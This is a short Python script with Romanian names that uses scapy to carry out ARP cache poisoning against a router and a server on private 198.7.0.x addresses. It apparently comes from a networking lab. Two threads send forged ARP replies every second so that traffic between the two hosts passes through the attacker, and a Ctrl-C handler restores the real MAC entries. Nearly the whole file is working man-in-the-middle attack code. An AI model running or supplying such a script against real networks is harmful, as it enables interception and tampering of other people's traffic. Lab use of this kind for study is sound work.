import scapy.all as scapy
import time
import signal
import sys

print("Functioneaza")

serv_ip = "198.7.0.2"
rou_ip = "198.7.0.1"

serv_mac = "02:42:c6:00:00:03"
rou_mac  = "02:42:ac:0a:00:01"

def trimite_pachet(targ_ip, gresit_ip):
    pac = scapy.ARP(op=2, pdst=targ_ip, psrc=gresit_ip)
    scapy.send(pac, verbose=False)

import threading

def otravire(tinta_ip, sursa_ip):
    while True:
        trimite_pachet(tinta_ip, sursa_ip)
        time.sleep(1)

# Pornește două threaduri — unul pentru router, unul pentru server
threading.Thread(target=otravire, args=(rou_ip, serv_ip)).start()
threading.Thread(target=otravire, args=(serv_ip, rou_ip)).start()

def restaureaza(tinta_ip, tinta_mac, real_ip, real_mac):
    pac = scapy.ARP(op=2, pdst=tinta_ip, hwdst=tinta_mac, psrc=real_ip, hwsrc=real_mac)
    scapy.send(pac, count=5, verbose=False)

def cleanup(sig, frame):
    print("\n[!] Oprire și restaurare ARP")
    restaureaza(rou_ip, rou_mac, serv_ip, serv_mac)
    restaureaza(serv_ip, serv_mac, rou_ip, rou_mac)
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)

otravire(serv_ip, rou_ip)
